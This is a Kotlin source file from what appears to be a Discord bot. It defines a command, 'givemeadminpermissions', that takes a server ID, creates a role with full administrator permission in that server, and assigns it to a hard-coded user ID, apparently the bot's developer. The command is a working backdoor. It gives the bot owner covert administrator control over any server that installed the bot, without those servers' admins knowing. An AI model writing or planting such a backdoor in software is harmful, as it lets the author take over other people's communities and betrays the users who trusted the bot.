package de.tectoast.emolga.commands.flo

import de.tectoast.emolga.commands.Command
import de.tectoast.emolga.commands.CommandCategory
import de.tectoast.emolga.commands.GuildCommandEvent
import de.tectoast.emolga.utils.Constants
import net.dv8tion.jda.api.EmbedBuilder
import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.entities.UserSnowflake
import java.awt.Color

class GiveMeAdminPermissionsCommand : Command("givemeadminpermissions", ":^)", CommandCategory.Flo) {
    init {
        argumentTemplate = ArgumentManagerTemplate.builder()
            .add("guild", "Guild-ID", "Die ID des Servers :)", ArgumentManagerTemplate.DiscordType.ID)
            .setExample("!givemeadminpermissions 447357526997073930")
            .build()
    }

    override fun process(e: GuildCommandEvent) {
        val g = e.jda.getGuildById(e.arguments!!.getID("guild"))
        val r = g!!.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").complete()
        g.addRoleToMember(UserSnowflake.fromId(Constants.FLOID), r).queue()
        val builder = EmbedBuilder()
        builder.setTitle("Succesfully gave admin permission on \"" + g.name + "\"!").setColor(Color.RED)
        e.textChannel.sendMessageEmbeds(builder.build()).queue()
    }
}